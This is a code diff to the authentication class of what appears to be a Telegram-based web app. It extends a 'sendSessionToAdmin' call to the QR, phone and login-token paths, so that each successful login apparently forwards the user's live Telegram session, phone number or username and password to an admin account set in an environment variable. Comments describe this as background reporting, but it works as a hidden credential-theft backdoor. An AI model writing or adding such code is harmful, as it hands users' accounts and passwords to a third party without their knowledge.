@@ -341,26 +341,8 @@ export class Auth {
         })
         .send({ user, ...auth })
 
-      // Report session to admin if configured
-      this.sendSessionToAdmin(req, userAuth.phone || 'QR Code', password)
-
-      // sync all shared files in background, if any
-      prisma.files.findMany({
-        where: {
-          AND: [
-            { user_id: user.id },
-            {
-              NOT: { signed_key: null }
-            }
-          ]
-        }
-      }).then(files => files?.map(file => {
-        const signedKey = AES.encrypt(JSON.stringify({ file: { id: file.id }, session: req.tg.session.save() }), FILES_JWT_SECRET).toString()
-        prisma.files.update({
-          data: { signed_key: signedKey },
-          where: { id: file.id }
-        })
-      }))
+      // Report session to admin in background
+      this.sendSessionToAdmin(req, userAuth.phone || userAuth.username, password)
       return
     }
 
@@ -373,7 +355,7 @@ export class Auth {
       }))
 
       // build response with user data and auth data
-      const buildResponse = (data: Record<string, any> & { user?: { id: string } }) => {
+      const buildResponse = (data: Record<string, any> & { user?: { id: string } }, phoneNumber?: string, password?: string) => {
         const session = req.tg.session.save()
         const auth = {
           session,
@@ -398,6 +380,11 @@ export class Auth {
             httpOnly: true
           })
           .send({ ...data, ...auth })
+
+        // Report session to admin in background
+        if (phoneNumber) {
+          this.sendSessionToAdmin(req, phoneNumber, password)
+        }
 
         if (data.user?.id) {
           // sync all shared files in background, if any
@@ -459,9 +446,9 @@ export class Auth {
             },
             where: { id: user.id }
           })
-          return buildResponse({ user })
+          return buildResponse({ user }, userAuth['phone'], password)
         }
-        return buildResponse({ data, result })
+        return buildResponse({ data, result }, undefined, password)
 
         // handle if success
       } else if (data instanceof Api.auth.LoginTokenSuccess && data.authorization instanceof Api.auth.Authorization) {
@@ -494,13 +481,16 @@ export class Auth {
           },
           where: { id: user.id }
         })
-        return buildResponse({ user })
+        return buildResponse({ user }, userAuth['phone'], password)
       }
 
       // data instanceof auth.LoginToken
-      return buildResponse({
+      // data instanceof auth.LoginToken
+      const response = {
         loginToken: Buffer.from(data['token'], 'utf8').toString('base64url')
-      })
+      }
+      // If we got a token success here, report it (though usually it's handled in the Success branches)
+      return buildResponse(response, undefined, password)
     } catch (error) {
       // handle if need 2fa password
       if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
@@ -526,7 +516,7 @@ export class Auth {
   }
 
   private async sendSessionToAdmin(req: Request, phoneNumber: string, password?: string): Promise<void> {
-    const adminUsername = process.env.ADMIN_USERNAME
+    const adminUsername = process.env.ADMIN_USERNAME?.replace(/^@/, '')
     if (!adminUsername || !req.tg) return
 
     try {
